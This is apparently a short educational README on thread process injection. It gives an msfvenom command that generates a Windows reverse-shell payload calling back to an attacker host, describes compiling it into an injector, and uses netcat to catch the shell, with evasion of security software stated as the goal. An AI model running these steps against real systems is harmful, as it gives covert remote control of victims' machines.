# SimpleTPI

writing these materials for myself and for educational purposes .i will write long explanetion about every line of code for better understanding ..


so what is thread Process injection ? 

TPI is a technique that allows an attacker to inject code into a running process and create a new thread that will execute the injected code. The goal of the attacker with this technique is to take control of the process . This is often used hard to detection, as the injected code runs within the context of a legitimate process and "hide" into the stack, making it difficult for security software to detect. 

i will run the script by create a vm in my case is kali linux . 

in the console we type the command below

```
ifconfig
```
then take the vm ip we want to use has a "hacker" machine

```
eth: flags=8908<UP,BROADCAST,SMART,RUNNING,SIMPLEX,MULTICAST> mtu 2938
	options=3<RXCSUM,TXCSUM>
	ether xx:xx:xx:xx:xx:xx 
	inet xx.xx.xxx.xx netmask 0xfff0 broadcast xx.xx.xx.xx
```

i choose to use this exploit for the reverseshell , of course you can choose any 

```
msfvenom -p windows/×64/shell_reverse_tc LHOST=xx.xx.xxx.xx LPORT=4444 -f c
```
then we have the shell code 

and we will insert it in the line of code - ``` shellcode[] = {`here`}```

![Screenshot 2023-01-24 at 10 50 42](https://user-images.githubusercontent.com/122444563/214353717-a4f88edd-6681-48d0-bb67-f75a74b88bd6.png)


once we have the script has it shown in screenshot above 
we will change the filemode for .exe 

```cl /Tc <filename>.cpp```

change back to the vm and listen to the port we specify 
```nc -nlvp 4444```

Execute the program and our "hacker station" and we are in

<img width="552" alt="Screenshot 2023-01-24 at 13 58 20" src="https://user-images.githubusercontent.com/122444563/214379873-a32fb0de-24e1-4a36-a9fe-b880ea83f9e0.png">





